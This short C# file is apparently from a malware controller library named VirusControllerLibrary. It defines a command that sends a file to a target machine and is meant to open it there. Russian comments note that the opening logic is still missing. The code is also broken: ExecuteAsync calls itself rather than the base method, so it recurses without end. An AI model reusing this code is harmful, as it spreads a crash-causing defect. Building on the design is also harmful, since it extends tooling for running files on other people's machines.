using System.Threading.Tasks;

namespace VirusControllerLibrary
{
    //можно сделать декоратор
    public class SendAndOpenFileCommand : SendFileCommand, IHaveOneTargetCommand
    {
        public SendAndOpenFileCommand(string targetId, string filePath) : base(targetId, filePath) { }

        public override async Task ExecuteAsync()
        {
            //тут ещё логика открытия файлы должна быть
            await ExecuteAsync();
        }
    }
}
